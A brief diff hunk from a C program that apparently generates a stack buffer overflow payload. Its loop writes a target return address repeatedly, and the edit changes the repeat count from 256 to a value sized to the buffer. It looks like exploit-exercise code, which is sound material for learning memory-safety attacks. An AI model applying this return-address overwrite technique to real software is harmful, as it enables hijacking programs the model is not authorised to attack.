@@ -65,7 +65,7 @@ int main(int argc,char *argv[]) {
 	word target=(word)address;
 	
 	// Hose return address over everything!
-	for (int brute=0;brute<256;brute++)
+	for (int brute=0;brute<(128+8+4+4)/4;brute++)
 		emit_word(target); 
 	
 	// Finish up with newline
